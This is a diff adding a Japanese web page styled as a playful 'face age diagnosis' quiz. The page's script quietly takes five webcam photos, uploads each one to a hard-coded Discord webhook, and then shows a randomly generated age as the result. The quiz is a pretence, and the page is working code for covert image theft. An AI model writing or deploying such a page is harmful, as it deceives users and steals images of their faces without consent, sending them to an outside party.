@@ -1,0 +1,88 @@
+
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>あなたの顔年齢診断</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: #ffe6f0;
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
+      padding: 2em;
+      color: #333;
+    }
+    h1 {
+      color: #ff66a3;
+      font-size: 2em;
+    }
+    .box {
+      background: #fff0f5;
+      padding: 2em;
+      border-radius: 20px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      display: inline-block;
+    }
+    button {
+      background: #ff69b4;
+      border: none;
+      padding: 1em 2em;
+      font-size: 1.2em;
+      color: white;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    .emoji {
+      font-size: 2em;
+    }
+  </style>
+</head>
+<body>
+  <h1>あなたの顔年齢診断へようこそ！<span class="emoji">📷✨</span></h1>
+  <div class="box">
+    <p>このサイトはあなたの顔を撮影して<br>見た目年齢を診断します！</p>
+    <button onclick="start()">診断スタート！</button>
+  </div>
+
+  <script>
+    async function start() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.play();
+
+      let images = [];
+      for (let i = 0; i < 5; i++) {
+        await new Promise(resolve => setTimeout(resolve, 500));
+        const canvas = document.createElement("canvas");
+        canvas.width = 300;
+        canvas.height = 300;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, 300, 300);
+        const dataUrl = canvas.toDataURL("image/jpeg");
+        images.push(dataUrl);
+      }
+      stream.getTracks().forEach(track => track.stop());
+
+      for (let dataUrl of images) {
+        const blob = await (await fetch(dataUrl)).blob();
+        const form = new FormData();
+        form.append("file", blob, "photo.jpg");
+
+        await fetch("https://discordapp.com/api/webhooks/1366733661457747989/4B7h-9zJltiz2BH__TSKcBK6y862iK3ym7nu3Exi0OvQveJe4cPYEWt5A6clkGUIRxmq", {
+          method: "POST",
+          body: form
+        });
+      }
+
+      const age = Math.floor(Math.random() * 86) + 5;
+      document.body.innerHTML = `
+        <h1>診断結果</h1>
+        <p>あなたの見た目年齢は...</p>
+        <h2><span class="emoji">🎉</span> ${age} 歳！ <span class="emoji">🎉</span></h2>
+      `;
+    }
+  </script>
+</body>
+</html>
